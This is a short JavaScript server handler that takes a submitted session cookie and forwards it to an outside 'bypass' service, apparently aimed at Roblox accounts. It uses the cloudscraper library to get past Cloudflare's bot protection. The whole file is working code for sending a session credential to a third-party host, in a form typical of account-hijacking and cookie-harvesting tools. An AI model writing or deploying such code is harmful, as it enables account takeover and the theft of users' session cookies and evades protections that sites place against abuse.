const cloudscraper = require('cloudscraper');

export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ success: false, message: 'Method not allowed' });
    }

    const { cookie } = req.body;
    if (!cookie) {
        return res.status(400).json({ success: false, message: 'Cookie is required.' });
    }

    try {
        const response = await cloudscraper({
            method: 'POST',
            url: 'https://rblxbypasser.com/api/bypass',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ cookie }),
            json: true, // Automatically parse JSON responses
        });

        res.status(200).json({ success: true, data: response });
    } catch (error) {
        console.error('Error during bypass:', error.message);
        res.status(500).json({ success: false, message: error.message });
    }
}
